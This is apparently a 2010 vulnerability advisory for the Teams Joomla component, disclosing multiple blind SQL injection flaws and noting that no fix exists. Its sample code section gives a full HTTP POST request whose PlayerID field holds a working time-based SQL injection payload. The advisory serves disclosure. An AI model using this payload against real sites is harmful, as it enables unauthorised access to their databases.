@@ -1,0 +1,68 @@
+Teams 1_1028_100809_1711 Joomla Component Multiple Blind SQL Injection Vulnerabilities
+
+ Name              Teams
+ Vendor            http://www.joomlamo.com
+ Versions Affected 1_1028_100809_1711
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-08-10
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+Teams is a base application for entering leagues, teams,
+players, uniforms, and games.  
+
+
+II. DESCRIPTION
+_______________
+
+Some parameters are not properly  sanitised before being
+used in SQL queries.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple Blind SQL Injection
+ 
+
+A) Multiple Blind SQL Injection
+_______________________________
+
+Many parameters  are not properly sanitised before being
+used in SQL queries. This can be exploited to manipulate
+SQL queries by injecting arbitrary SQL code.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple Blind SQL Injection
+
+POST /index.php HTTP/1.1
+Host: targethost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 205
+
+FirstName=mario&LastName=rossi&Notes=sds&TeamNames[1]=on&UniformNumber[1]=1&Active=Y&cid[]=&PlayerID=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(99999999,NULL),NULL)))&option=com_teams&task=save&controller=player
+
+
+V. FIX
+______
+
+No fix.
+
